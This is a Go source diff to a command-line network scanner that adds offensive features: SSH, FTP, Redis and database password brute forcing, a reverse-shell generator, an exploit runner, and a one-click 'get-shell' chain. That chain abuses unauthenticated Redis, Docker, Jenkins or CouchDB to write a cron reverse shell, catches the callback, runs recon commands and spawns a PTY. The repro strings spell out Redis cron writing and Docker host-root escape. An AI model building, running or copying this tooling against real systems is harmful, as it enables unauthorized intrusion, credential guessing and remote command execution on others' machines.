@@ -5,6 +5,7 @@ import (
 	"encoding/xml"
 	"flag"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"sort"
@@ -13,57 +14,86 @@ import (
 	"sync"
 	"time"
 
+	"golang.org/x/term"
+
 	"portscanner/internal/scanner"
 )
 
 var version = "dev"
 
 type cliFlags struct {
-	targets      string
-	ports        string
-	excludePorts string
-	sT, sS, sU   bool
+	targets        string
+	ports          string
+	excludePorts   string
+	sT, sS, sU     bool
 	sF, sN, sX, sA bool
-	timing       int
-	skipDisc     bool
-	discOnly     bool
-	versionDet   bool
-	osDetect     bool
-	dns          bool
-	rate         int
-	randomize    bool
-	verbose      bool
-	outNormal    string
-	outXML       string
-	outGrepable  string
-	outJSON      string
-	outCSV       string
-	sortBy       string
-	pingOnly     bool
-	banner       bool
-	traceroute   bool
-	trMax        int
-	dirSearch    bool
-	subBrute     bool
-	whois        bool
-	dnsRecords   bool
-	webCheck     bool
-	useHTTPS     bool
-	proxy        string
-	stopAfter    bool
-	maxTargets   int
-	poc          bool
-	fingerprint  bool
-	subDepth     int
-	monitor      string
-	interval     string
-	forceRaw     bool
-	outHTML      string
-	showHelp     bool
-	showVersion  bool
+	timing         int
+	skipDisc       bool
+	discOnly       bool
+	versionDet     bool
+	osDetect       bool
+	dns            bool
+	rate           int
+	randomize      bool
+	verbose        bool
+	outNormal      string
+	outXML         string
+	outGrepable    string
+	outJSON        string
+	outCSV         string
+	sortBy         string
+	pingOnly       bool
+	banner         bool
+	traceroute     bool
+	trMax          int
+	dirSearch      bool
+	subBrute       bool
+	whois          bool
+	dnsRecords     bool
+	webCheck       bool
+	useHTTPS       bool
+	proxy          string
+	pluginMarket   string
+	stopAfter      bool
+	maxTargets     int
+	poc            bool
+	fingerprint    bool
+	subDepth       int
+	monitor        string
+	interval       string
+	forceRaw       bool
+	outHTML        string
+	brute          string
+	userDict       string
+	passDict       string
+	bruteDelay     int
+	bruteThreads   int
+	shell          string
+	lhost          string
+	lport          int
+	exploit        string
+	exploitList    bool
+	getShell       bool
+	vulnReport     bool
+	scanVuln       bool
+	pocScan        bool
+	sshShell       bool
+	sshConnect     bool
+	sshUser        string
+	sshPass        string
+	store          bool
+	history        bool
+	diff           bool
+	showHelp       bool
+	showVersion    bool
 }
 
 func main() {
+	if dispatchSubcommand() {
+		return
+	}
+	// 加载用户自定义模块(modules/ 目录, 平台化可替换)
+	scanner.OpenModuleManager("").Load()
 	var f cliFlags
 	flag.StringVar(&f.targets, "target", "", "扫描目标(必填), 支持 IP/CIDR/范围/域名, 逗号分隔")
 	flag.StringVar(&f.ports, "p", "1-65535", "端口表达式: 80 / 1-1000 / 22,80-90 / top-1000 / -(全部)")
@@ -101,6 +131,7 @@ func main() {
 	flag.BoolVar(&f.webCheck, "web", false, "HTTP 安全头检查")
 	flag.BoolVar(&f.useHTTPS, "https", false, "使用 HTTPS(配合 -dir/-web)")
 	flag.StringVar(&f.proxy, "proxy", "", "代理地址: socks5://127.0.0.1:1080 或 http://127.0.0.1:8080")
+	flag.StringVar(&f.pluginMarket, "plugin-market", "", "插件市场远程地址(如 http://host:port)")
 	flag.BoolVar(&f.stopAfter, "stop-after-host", false, "命中第一个存活主机/开放端口后立即停止")
 	flag.IntVar(&f.maxTargets, "max-targets", 10000, "目标 IP 数量上限(防止误扫大网段)")
 	flag.BoolVar(&f.poc, "poc", false, "高危端口未授权访问检测")
@@ -110,13 +141,56 @@ func main() {
 	flag.StringVar(&f.interval, "interval", "", "监控间隔(如 24h, 1h30m), 留空则只执行一次")
 	flag.BoolVar(&f.forceRaw, "force-raw", false, "强制使用 raw socket(覆盖 proot 安全降级)")
 	flag.StringVar(&f.outHTML, "oH", "", "HTML 报告输出文件")
+	flag.StringVar(&f.brute, "brute", "", "服务弱口令爆破: ftp/ssh/telnet/redis/smtp/mysql/postgresql")
+	flag.StringVar(&f.userDict, "user-dict", "", "用户名字典文件(留空用内置字典)")
+	flag.StringVar(&f.passDict, "pass-dict", "", "密码字典文件(留空用内置字典)")
+	flag.IntVar(&f.bruteDelay, "brute-delay", 0, "爆破延迟(毫秒, 防封 IP)")
+	flag.IntVar(&f.bruteThreads, "brute-threads", 10, "爆破线程数")
+	flag.StringVar(&f.shell, "shell", "", "生成反弹 shell: bash/nc/python/php/perl/powershell 等")
+	flag.StringVar(&f.lhost, "lhost", "", "反弹 shell 监听地址")
+	flag.IntVar(&f.lport, "lport", 4444, "反弹 shell 监听端口")
+	flag.StringVar(&f.exploit, "exploit", "", "漏洞利用: auto 或模块名(见 --exploit-list)")
+	flag.BoolVar(&f.exploitList, "exploit-list", false, "列出所有利用模块")
+	flag.BoolVar(&f.getShell, "get-shell", false, "一键拿 shell: 检测未授权→写 cron 反弹 shell→监听(需 --lhost)")
+	flag.BoolVar(&f.vulnReport, "vuln-report", false, "输出所有可检测漏洞的名称与复现步骤")
+	flag.BoolVar(&f.scanVuln, "scan-vuln", false, "针对目标扫描所有漏洞, 仅输出命中的漏洞+复现步骤")
+	flag.BoolVar(&f.pocScan, "poc-scan", false, "批量扫描 Web POC 模板(内置+自定义), 命中生成漏洞报告")
+	flag.BoolVar(&f.sshShell, "ssh-shell", false, "SSH 爆破成功后进入交互式 shell")
+	flag.BoolVar(&f.sshConnect, "ssh-connect", false, "用 --ssh-user/--ssh-pass 直接建立交互式 SSH shell")
+	flag.StringVar(&f.sshUser, "ssh-user", "", "SSH 用户名(配合 --ssh-connect)")
+	flag.StringVar(&f.sshPass, "ssh-pass", "", "SSH 密码(配合 --ssh-connect)")
+	flag.BoolVar(&f.store, "store", false, "保存扫描结果到资产库")
+	flag.BoolVar(&f.history, "history", false, "查看目标历史扫描记录")
+	flag.BoolVar(&f.diff, "diff", false, "与上次扫描结果对比")
 	flag.BoolVar(&f.showHelp, "h", false, "显示帮助")
 	flag.BoolVar(&f.showVersion, "version", false, "显示版本号")
 	flag.Parse()
 
+	// 插件市场远程地址
+	if f.pluginMarket != "" {
+		scanner.SetMarketURL(strings.TrimRight(f.pluginMarket, "/"))
+	}
+
 	if f.showVersion {
 		fmt.Printf("NetScan %s\n", version)
 		os.Exit(0)
+	}
+
+	if f.exploitList {
+		for _, n := range scanner.ExploitList() {
+			fmt.Println(n)
+		}
+		return
+	}
+	if f.vulnReport {
+		fmt.Print(scanner.VulnReport())
+		return
+	}
+
+	// 反弹 shell 生成(无需目标)
+	if f.shell != "" {
+		runShellGen(f)
+		return
 	}
 
 	if f.showHelp || f.targets == "" {
@@ -124,6 +198,38 @@ func main() {
 		os.Exit(1)
 	}
 
+	if f.scanVuln {
+		runScanVuln(f)
+		return
+	}
+	if f.pocScan {
+		runPocScan(f)
+		return
+	}
+	if f.brute != "" {
+		runBrute(f)
+		return
+	}
+	if f.exploit != "" {
+		runExploit(f)
+		return
+	}
+	if f.getShell {
+		runGetShell(f)
+		return
+	}
+	if f.sshConnect {
+		runSSHConnect(f)
+		return
+	}
+	if f.sshShell {
+		runSSHShell(f)
+		return
+	}
+	if f.history {
+		runHistory(f)
+		return
+	}
 	if f.traceroute {
 		runTraceroute(f)
 		return
@@ -171,7 +277,65 @@ func main() {
 		grabBanners(results)
 	}
 
+	if f.store {
+		storeScan(f, results)
+	}
+	if f.diff {
+		diffScan(f, results)
+	}
+
 	printSummary(results)
+}
+
+// storeScan 保存扫描结果到资产库
+func storeScan(f cliFlags, results []scanner.Result) {
+	target := strings.Join(splitList(f.targets), ",")
+	s := scanner.OpenStore(scanner.DefaultStateDir())
+	if err := s.Save(target, results); err != nil {
+		fmt.Fprintf(os.Stderr, "保存失败: %v\n", err)
+		return
+	}
+	fmt.Fprintf(os.Stderr, "已保存扫描结果到资产库(目标: %s)\n", target)
+}
+
+// diffScan 与上次扫描结果对比
+func diffScan(f cliFlags, results []scanner.Result) {
+	target := strings.Join(splitList(f.targets), ",")
+	s := scanner.OpenStore(scanner.DefaultStateDir())
+	added, removed, _ := s.Diff(target, results)
+	for _, a := range added {
+		fmt.Printf("+ 新增 %s:%d/%s %s\n", a.IP, a.Port, a.Protocol, a.Service)
+	}
+	for _, a := range removed {
+		fmt.Printf("- 消失 %s:%d/%s %s\n", a.IP, a.Port, a.Protocol, a.Service)
+	}
+	if len(added) == 0 && len(removed) == 0 {
+		fmt.Println("与上次扫描无变化")
+	}
+}
+
+// runHistory 查看历史记录
+func runHistory(f cliFlags) {
+	target := strings.Join(splitList(f.targets), ",")
+	s := scanner.OpenStore(scanner.DefaultStateDir())
+	recs, err := s.History(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无历史记录: %v\n", err)
+		return
+	}
+	for _, rec := range recs {
+		fmt.Printf("=== %s (扫描时间 %s) ===\n", rec.Target, rec.Time.Format("2006-01-02 15:04:05"))
+		for _, a := range rec.Assets {
+			line := fmt.Sprintf("  %s:%-5d/%-3s %-20s", a.IP, a.Port, a.Protocol, a.Service)
+			if a.Version != "" {
+				line += " " + a.Version
+			}
+			if a.Vuln != "" {
+				line += "  [!]" + a.Vuln
+			}
+			fmt.Println(line)
+		}
+	}
 }
 
 func buildOptions(f cliFlags) scanner.Options {
@@ -251,6 +415,15 @@ func runScan(opts scanner.Options, f cliFlags) ([]scanner.Result, error) {
 	err := s.Run()
 	elapsed := time.Since(start)
 	fmt.Fprintf(os.Stderr, "\n用时: %s\n", elapsed.Round(time.Millisecond))
+	// 插件: notification 推送 / report 生成报告 / output 自定义输出
+	pm := scanner.OpenPluginManager("")
+	pm.Notify(results)
+	for _, path := range pm.GenerateReports(strings.Join(opts.Targets, ","), opts.Ports, results) {
+		fmt.Fprintf(os.Stderr, "[插件报告] 已生成: %s\n", path)
+	}
+	for name, text := range pm.RenderOutput(results) {
+		fmt.Printf("\n===== 插件输出: %s =====\n%s", name, text)
+	}
 	return results, err
 }
 
@@ -398,7 +571,7 @@ func runPing(f cliFlags) {
 			fmt.Printf("%s\t无法解析\n", t)
 			continue
 		}
-		rtt, ok := scanner.Ping(ip, timeout)
+		rtt, ok := scanner.PingAny(ip, timeout)
 		if ok {
 			fmt.Printf("%s\t存活\t延迟 %v\n", ip, rtt.Round(time.Millisecond))
 		} else {
@@ -533,6 +706,336 @@ func schemeDesc(https bool) string {
 		return "https"
 	}
 	return "http"
+}
+
+// ---- 漏洞利用 / 爆破 / 反弹 Shell ----
+
+// runShellGen 生成反弹 shell 命令
+func runShellGen(f cliFlags) {
+	if f.lhost == "" {
+		fmt.Fprintln(os.Stderr, "请用 --lhost 指定监听地址")
+		os.Exit(1)
+	}
+	cmd := scanner.ReverseShell(f.shell, f.lhost, f.lport)
+	if cmd == "" {
+		fmt.Fprintf(os.Stderr, "不支持的 shell 类型: %s, 可用: %s\n", f.shell, strings.Join(scanner.ShellTypeList(), ", "))
+		os.Exit(1)
+	}
+	fmt.Printf("反弹 shell (%s) -> %s:%d\n%s\n", f.shell, f.lhost, f.lport, cmd)
+}
+
+// runBrute 服务弱口令爆破
+func runBrute(f cliFlags) {
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 0)
+	if port == 0 {
+		// 根据服务类型取默认端口
+		port = defaultServicePort(f.brute)
+	}
+	users := loadDict(f.userDict)
+	passes := loadDict(f.passDict)
+	fmt.Fprintf(os.Stderr, "爆破 %s://%s:%d (用户 %d 个, 密码 %d 个)\n", f.brute, ip, port, len(users), len(passes))
+
+	scanner.BruteForce(ip, port, f.brute, users, passes, f.bruteThreads,
+		time.Duration(f.bruteDelay)*time.Millisecond, 3*time.Second,
+		func(r scanner.BruteResult) {
+			fmt.Printf("[成功] %s://%s:%d  用户名: %s  密码: %s\n", r.Service, ip, port, r.Username, r.Password)
+		})
+}
+
+// runExploit 漏洞利用
+func runExploit(f cliFlags) {
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 0)
+	if port == 0 {
+		port = defaultServicePort(f.exploit)
+	}
+	var result string
+	if f.exploit == "auto" {
+		result = scanner.AutoExploit(ip, port, "", 5*time.Second)
+	} else {
+		result = scanner.RunExploit(f.exploit, ip, port, 5*time.Second)
+	}
+	fmt.Printf("[利用] %s %s:%d\n%s\n", f.exploit, ip, port, result)
+}
+
+// shellVulnName 返回一键拿 shell 对应的漏洞名称
+func shellVulnName(port int) string {
+	switch port {
+	case 6379:
+		return "Redis 未授权访问(INFO 可执行, 可被写文件/提权)"
+	case 2375, 2376:
+		return "Docker API 未授权访问(可创建特权容器逃逸)"
+	case 8080, 8090:
+		return "Jenkins 未授权脚本控制台 RCE"
+	case 5984:
+		return "CouchDB 未授权访问(query_servers RCE)"
+	default:
+		return "未授权访问"
+	}
+}
+
+// shellReproStep 返回一键拿 shell 的复现步骤
+func shellReproStep(ip string, port int, lhost string, lport int) string {
+	switch port {
+	case 6379:
+		return fmt.Sprintf("连接 %s:%d 发送 INFO 响应含 redis_version 即未授权; 再 CONFIG SET dir /var/spool/cron + SET 载荷 + SAVE 写入 cron 反弹 shell", ip, port)
+	case 2375, 2376:
+		return fmt.Sprintf("访问 http://%s:%d/version 响应含 ApiVersion 即未授权; 再创建特权容器挂载宿主根 / 到 /host, exec chroot /host 执行反弹 shell", ip, port)
+	case 8080, 8090:
+		return fmt.Sprintf("访问 http://%s:%d/script 可匿名访问即未授权; 再 POST Groovy ProcessBuilder 执行 bash 反弹 shell", ip, port)
+	case 5984:
+		return fmt.Sprintf("访问 http://%s:%d/_all_dbs 可读即未授权; 再 PUT /_config/query_servers 注入命令", ip, port)
+	default:
+		return ""
+	}
+}
+
+// runPocScan 批量扫描 Web POC 模板并生成漏洞报告
+func runPocScan(f cliFlags) {
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 80)
+	fmt.Fprintf(os.Stderr, "扫描 Web POC: %s:%d ...\n", ip, port)
+	hits := scanner.ScanPOCs(ip, port, 3*time.Second)
+	if len(hits) == 0 {
+		fmt.Println("未命中任何 POC")
+		return
+	}
+	fmt.Printf("\n命中 %d 个 POC:\n\n", len(hits))
+	for _, h := range hits {
+		fmt.Printf("● %s\n  复现步骤: %s\n\n", h.Name, h.Steps)
+	}
+}
+
+// runScanVuln 针对目标扫描所有漏洞, 仅输出命中的漏洞+复现步骤
+func runScanVuln(f cliFlags) {
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 80)
+	fmt.Fprintf(os.Stderr, "扫描漏洞: %s:%d ...\n", ip, port)
+	hits := scanner.ScanVulns(ip, port, 3*time.Second)
+	if len(hits) == 0 {
+		fmt.Println("未发现漏洞")
+		return
+	}
+	fmt.Printf("\n命中 %d 个漏洞:\n\n", len(hits))
+	for _, h := range hits {
+		fmt.Printf("● %s\n  复现步骤: %s\n\n", h.Name, h.Steps)
+	}
+}
+
+// runSSHConnect 用指定凭据直接建立交互式 SSH shell
+func runSSHConnect(f cliFlags) {
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 22)
+	if f.sshUser == "" || f.sshPass == "" {
+		fmt.Fprintln(os.Stderr, "需指定 --ssh-user 和 --ssh-pass")
+		os.Exit(1)
+	}
+	fmt.Fprintf(os.Stderr, "[*] 连接 SSH %s@%s:%d ...\n\n", f.sshUser, ip, port)
+	restore := rawModeRestore()
+	defer restore()
+	if err := scanner.SSHInteractive(ip, port, f.sshUser, f.sshPass, 10*time.Second); err != nil {
+		fmt.Fprintf(os.Stderr, "SSH 连接失败: %v\n", err)
+		os.Exit(1)
+	}
+}
+
+// runSSHShell 爆破 SSH 成功后进入交互式 shell
+func runSSHShell(f cliFlags) {
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 22)
+	users := loadDict(f.userDict)
+	passes := loadDict(f.passDict)
+	fmt.Fprintf(os.Stderr, "爆破 ssh://%s:%d (用户 %d, 密码 %d)...\n", ip, port, len(users), len(passes))
+	user, pass, ok := scanner.BruteSSHOnce(ip, port, users, passes, f.bruteThreads, 3*time.Second)
+	if !ok {
+		fmt.Fprintln(os.Stderr, "爆破失败, 未找到凭据")
+		os.Exit(1)
+	}
+	fmt.Printf("[成功] ssh://%s:%d  用户:%s 密码:%s\n\n", ip, port, user, pass)
+	restore := rawModeRestore()
+	defer restore()
+	if err := scanner.SSHInteractive(ip, port, user, pass, 10*time.Second); err != nil {
+		fmt.Fprintf(os.Stderr, "SSH 连接失败: %v\n", err)
+		os.Exit(1)
+	}
+}
+
+// rawModeRestore 进入 raw 模式(交互终端时), 返回恢复函数
+func rawModeRestore() func() {
+	if !term.IsTerminal(int(os.Stdin.Fd())) {
+		return func() {}
+	}
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		return func() {}
+	}
+	return func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }
+}
+
+// runGetShell 一键拿 shell: 检测未授权→写 cron 反弹 shell→监听并交互
+func runGetShell(f cliFlags) {
+	if f.lhost == "" {
+		fmt.Fprintln(os.Stderr, "一键拿 shell 需指定 --lhost(回连地址)")
+		os.Exit(1)
+	}
+	target := splitList(f.targets)[0]
+	ip, err := resolveTarget(target)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法解析 %s: %v\n", target, err)
+		os.Exit(1)
+	}
+	port := firstPort(f.ports, 0)
+	if port == 0 {
+		port = 6379
+	}
+
+	// 启动监听器
+	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", f.lport))
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "监听 %d 失败: %v\n", f.lport, err)
+		os.Exit(1)
+	}
+	defer ln.Close()
+	fmt.Printf("[*] 监听 %d 等待反弹 shell...\n", f.lport)
+
+	// 执行一键拿 shell(按服务自动选择利用链)
+	result := scanner.GetShell(ip, port, f.lhost, f.lport, 5*time.Second)
+	fmt.Printf("[利用] %s:%d\n%s\n", ip, port, result)
+	fmt.Printf("[漏洞] %s\n", shellVulnName(port))
+	fmt.Printf("[复现] %s\n", shellReproStep(ip, port, f.lhost, f.lport))
+	if strings.HasPrefix(result, "目标") || strings.HasPrefix(result, "写入失败") || strings.HasPrefix(result, "连接失败") || strings.HasPrefix(result, "端口") {
+		return
+	}
+
+	// 等待 shell 回连(默认 60 秒)
+	ln.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
+	conn, err := ln.Accept()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "[-] 60 秒内未收到 shell 连接")
+		return
+	}
+	defer conn.Close()
+	fmt.Printf("[+] 收到反弹 shell: %s\n\n", conn.RemoteAddr())
+
+	// 先发几条命令证明 RCE
+	_, _ = conn.Write([]byte("rm -f /var/spool/cron/root; echo '=== RCE OK ==='; id; hostname; uname -a; whoami\n"))
+	time.Sleep(400 * time.Millisecond) // 等 bash 启动并执行命令
+	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	var sb strings.Builder
+	buf := make([]byte, 8192)
+	for {
+		n, err := conn.Read(buf)
+		if n > 0 {
+			sb.Write(buf[:n])
+		}
+		if err != nil {
+			break
+		}
+	}
+	if sb.Len() > 0 {
+		fmt.Print(sb.String())
+	}
+
+	// 仅在交互终端下进入交互 shell; 非交互(管道)直接退出
+	if !term.IsTerminal(int(os.Stdin.Fd())) {
+		fmt.Println("\n[*] 非交互终端, shell 已断开")
+		return
+	}
+	// 本地终端设为 raw 模式: 否则输入需回车才发送、Ctrl+C/方向键失效
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		fmt.Println("[-] 进入 raw 模式失败, 交互可能异常")
+	} else {
+		defer term.Restore(int(os.Stdin.Fd()), oldState)
+	}
+	_ = conn.SetReadDeadline(time.Time{})
+	// 自动升级 PTY: 让远端 bash 获得 job control, 可运行 vim/top/sudo 等
+	_, _ = conn.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n"))
+	go func() { _, _ = io.Copy(conn, os.Stdin) }()
+	_, _ = io.Copy(os.Stdout, conn)
+	fmt.Println("\n[*] shell 已断开")
+}
+
+// defaultServicePort 根据服务/模块名返回默认端口
+func defaultServicePort(name string) int {
+	switch strings.ToLower(name) {
+	case "ftp":
+		return 21
+	case "ssh":
+		return 22
+	case "telnet":
+		return 23
+	case "smtp":
+		return 25
+	case "mysql":
+		return 3306
+	case "postgresql":
+		return 5432
+	case "redis", "redis-write-shell":
+		return 6379
+	case "docker", "docker-escape":
+		return 2375
+	case "elasticsearch", "es-file-read":
+		return 9200
+	case "nacos", "nacos-register":
+		return 8848
+	case "jenkins", "jenkins-script":
+		return 8080
+	case "tomcat", "tomcat-war":
+		return 8080
+	}
+	return 80
+}
+
+// loadDict 从文件加载字典(每行一条), 失败返回 nil(用内置字典)
+func loadDict(path string) []string {
+	if path == "" {
+		return nil
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "读取字典失败 %s: %v\n", path, err)
+		return nil
+	}
+	var out []string
+	for _, line := range strings.Split(string(data), "\n") {
+		line = strings.TrimSpace(line)
+		if line != "" {
+			out = append(out, line)
+		}
+	}
+	return out
 }
 
 // ---- 定时扫描 + 变更监控 ----
@@ -688,10 +1191,10 @@ type xmlHost struct {
 }
 
 type xmlPort struct {
-	Protocol string    `xml:"protocol,attr"`
-	PortID   int       `xml:"portid,attr"`
-	State    xmlState  `xml:"state"`
-	Service  xmlSvc    `xml:"service"`
+	Protocol string   `xml:"protocol,attr"`
+	PortID   int      `xml:"portid,attr"`
+	State    xmlState `xml:"state"`
+	Service  xmlSvc   `xml:"service"`
 }
 
 type xmlState struct {
